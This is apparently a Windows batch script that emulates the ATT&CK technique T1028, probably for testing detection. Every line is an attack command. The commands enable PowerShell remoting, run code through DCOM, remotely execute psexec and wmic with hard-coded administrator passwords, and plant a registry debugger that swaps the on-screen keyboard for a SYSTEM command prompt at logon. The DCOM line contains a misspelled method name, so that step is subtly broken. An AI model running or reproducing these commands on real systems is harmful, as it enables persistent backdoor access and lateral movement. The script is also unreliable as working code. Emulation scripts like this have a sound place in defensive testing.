@ECHO OFF
CLS
color 0E


ECHO ===========================================================================
ECHO Technique: Windows Remote Management	(T1028)
ECHO.
ECHO [+] Using WinRM, PSRemoting,Psexec to Remote Administration
ECHO -------------------------------------------------------------------
cmd /c powershell Enable-PSRemoting -Force
powershell.exe [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.application","127.0.0.1")).Documnet.ActiveView.ExecuteShellCommand("c:\windows\system32\calc.exe", $null, $null, "7")
wmic /user:DOMAIN\Administrator /password:pass123 /node:127.0.0.1 process call create "C:\Windows\system32\reg.exe add \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe\" /v \"Debugger\" /t REG_SZ /d \"cmd.exe\" /f"
%Utilities%psexec \\host -u DOMAIN\Administrator -p password -s cmd.exe
powershell.exe invoke-command -computername "127.0.0.1" -scriptblock {ipconfig}
ECHO.

